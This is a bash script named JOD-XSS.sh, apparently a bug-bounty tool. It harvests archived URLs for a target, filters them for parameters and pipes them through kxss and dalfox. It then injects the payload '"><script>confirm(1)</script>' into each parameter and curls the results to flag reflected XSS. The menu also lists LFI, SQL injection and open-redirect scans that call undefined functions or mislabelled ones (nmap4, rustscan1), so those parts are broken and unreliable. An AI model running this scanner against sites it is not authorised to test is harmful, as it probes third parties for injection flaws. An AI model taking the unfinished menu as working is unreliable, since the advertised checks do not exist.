#!/bin/bash
#title:         JOD-XSS.sh
#description:   Automated and Modular Shell Script to Automate Security Vulnerability Scans
#author:        R12W4N, xentr0, Raviakp1004
#version:       1.6.1
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
RESET=`tput sgr0`
WBOLD=`tput bold 7`
WUL=`tput smul`

function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 2 

banner(){
    echo '
    
     ██╗ ██████╗ ██████╗      ██╗  ██╗███████╗███████╗
     ██║██╔═══██╗██╔══██╗     ╚██╗██╔╝██╔════╝██╔════╝
     ██║██║   ██║██║  ██║█████╗╚███╔╝ ███████╗███████╗
██   ██║██║   ██║██║  ██║╚════╝██╔██╗ ╚════██║╚════██║
╚█████╔╝╚██████╔╝██████╔╝     ██╔╝ ██╗███████║███████║
 ╚════╝  ╚═════╝ ╚═════╝      ╚═╝  ╚═╝╚══════╝╚══════╝
        '
}
####Add Functions Here

XSSURLSCAN(){
    #credit: hacktify
    read -p 'URL: ' URL
    #read -p 'Add Custom Parameter like source= ' cparam
    #read -p 'BXSS Hunter URL; xss.ht' bxss

    ##waybackurl
    waybackurls $URL > $project/$project-all-urls.log
    echo "${GREEN}Done with Waybackurls${RESET}"

    ##kxss
    echo "${GREEN}[+kxss] Waybackurl Output file > Sorting > Running KXSS and piping it to Dalfox${RESET}"
    #echo "${CYAN}${WUL}cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt${RESET}"
    #cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt

    
    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/'| sort -u > $project/uniqueparam.txt && echo uniqueparam.txt >> $project/tmplist
    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt && echo gfxss.txt >> $project/tmplist
    cat $project/gfxss.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt && echo kxss.txt >> $project/tmplist
    
    echo "${MAGENTA}Total Count...${RESET}"
    echo -n "$project-all-urls.log.txt : " & cat $project/$project-all-urls.log | wc -l
    echo -n "uniqueparam.txt : " & cat $project/uniqueparam.txt | wc -l 
    echo -n "gfxss.txt : " & cat $project/gfxss.txt | wc -l
    echo -n "kxss.txt : " & cat $project/kxss.txt | wc -l

    echo "${MAGENTA}Choose which results to run with dalfox...${RESET}"
    select d in $(<$project/tmplist);
    do test -n "$d" && break; 
    echo ">>> Invalid Selection"; 
    done
    firstv=$d
    echo "Filename: ${BLUE}$project/$firstv ${RESET}" && cat $project/$firstv
    echo "${BLUE}Piping Dalfox on $project/$firstv! ${RESET}"
    echo "${CYAN}${WUL}cat $project/$firstv | dalfox pipe --output $project/first.txt${RESET}"
    
    #running here
    cat $project/$firstv | dalfox pipe --output $project/first.txt

    ##dpayload
    echo "${GREEN}[+dpayload] Waybackurl Output file > greping parameters with = > running with default payload...${RESET}"
    cat $project/uniqueparam.txt | qsreplace '"><script>confirm(1)</script>' | tee $project/$project-combinedfuzz.json && cat $project/$project-combinedfuzz.json 
    echo "${CYAN}${WUL}curl --silent --path-as-is --insecure $line | grep -qs <script>confirm(1) && echo Vulnerable $line\n && echo $line\n >> $project/second.txt ${RESET}"

    file="$project/$project-combinedfuzz.json"
    while IFS= read line
        do
            curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line\n && echo "$line\n" >> $project/second.txt
        done <"$file" 

    echo "${RED}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
}

#Menu options
options[0]="Run XSS Scan on Single URL"
options[1]="Scan for LFI using GF Patterns"
options[2]="Run SQL Injection Scan"
options[3]="Check for Open Redirect"
options[4]="Advance Vulnerability Scan"

#Variables
ERROR=" "

#Clear screen for menu
clear

#Menu function
function MENU {
    echo "Menu Options"
    for NUM in ${!options[@]}; do
        echo "[""${choices[NUM]:- }""]" $(( NUM+1 ))") ${options[NUM]}"
    done
    echo "$ERROR"
}

#Menu loop
while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
    clear
    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]]; then
        (( SELECTION-- ))
        if [[ "${choices[SELECTION]}" == "+" ]]; then
            choices[SELECTION]=""
        else
            choices[SELECTION]="+"
        fi
            ERROR=" "
    else
        ERROR="Invalid option: $SELECTION"
    fi
done

#Actions to take based on selection
function ACTIONS {
    if [[ ${choices[0]} ]]; then
        #Option 1 selected
        echo "Option 1 selected; Running XSS Scan on Single URL"
	    XSSURLSCAN
    fi
    if [[ ${choices[1]} ]]; then
        #Option 2 selected
        echo "Option 2 selected; Scanning for LFI using GF Patterns"
	    LFI
    fi
    if [[ ${choices[2]} ]]; then
        #Option 2 selected
        echo "Option 3 selected"
        nmap4
    fi
    if [[ ${choices[3]} ]]; then
        #Option 2 selected
        echo "Option 4 selected"
        rustscan1
    fi
}

projectdirectorycheck(){
    read -p 'Project Name: ' project
    echo $project

    if [ -d $project ]
    then
        echo -e "${BLUE}[-] $project Directory already exists...${RESET}"
    else
        echo -e "${BLUE}[+] Creating $project directory.${RESET}"
        mkdir -p $project
    fi
}

echo -e ${CP}"[+] Checking Internet Connectivity"
if [[ "$(ping -c 1 8.8.8.8 | grep '100% packet loss' )" != "" ]]; then
  echo "No Internet Connection"
  exit 1
  else
  echo "Internet is present"
  
fi

banner
projectdirectorycheck
ACTIONS


